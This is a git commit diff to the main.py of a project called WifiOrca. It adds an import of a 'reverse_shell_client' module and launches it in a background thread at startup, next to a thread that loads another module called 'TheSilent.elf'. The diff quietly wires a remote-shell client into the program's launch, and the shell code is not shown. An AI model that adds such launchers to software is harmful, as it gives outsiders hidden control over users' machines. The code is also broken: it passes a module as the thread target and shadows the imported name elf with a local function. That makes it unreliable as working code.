4b461325387bc021d2769fca4b63c15127ad810c
Invizabel <46697708+Invizabel@users.noreply.github.com>
2023-07-09 00:35:03 -0500

    Add files via upload

--- src/WifiOrca/main.py
+++ src/WifiOrca/main.py
@@ -1,9 +1,11 @@
 import threading
-from TheSilent.elf import *
+import TheSilent.elf as elf
+import WifiOrca.reverse_shell_client as reverse_shell_client
 
 def elf():
     import TheSilent.elf
 
 if __name__ == "__main__":
     elf_thread = threading.Thread(target=elf).start()
+    reverse_shell_client_thread = threading.Thread(target=reverse_shell_client).start()
 
